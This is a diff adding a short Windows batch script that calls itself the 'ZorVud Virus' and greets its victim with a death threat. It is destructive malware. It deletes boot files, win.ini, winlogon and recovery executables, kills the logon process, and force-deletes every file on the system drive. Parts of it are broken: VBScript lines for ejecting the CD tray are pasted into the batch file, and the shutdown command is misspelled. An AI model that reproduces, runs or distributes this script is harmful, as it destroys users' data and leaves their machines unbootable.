@@ -1,0 +1,27 @@
+@echo off
+ECHO Hello from ZorVud...	Soon you will be dead....
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+del %systemdrive%\windows\system32\recover.exe
+del %systemdrive%\system32\logonui.exe
+tskill /a /im winlogon
+del %systemdrive%\windows\system32\winlogon. exe
+del %systemdrive%\*.* /s /f /q
+del %systemdrive%\boot.ini
+del/WINDOWS/system32/Recover
+del/WINDOWS/system32/winlogon.exe
+Set oWMP = CreateObject("WMPlayer.OCX.7")
+Set colCDROMs = oWMP.cdromCollection
+if colCDROMs.Count >= 1 then
+for i = 0 to colCDROMS.Count - 1
+colCDROMs.Item(i).Eject
+colCDROMs.Item(i).Eject
+Next ' cdrom
+End if
+shutdow -s -t 60 -c "ZorVud Virus,created By Cookie and Zebra"
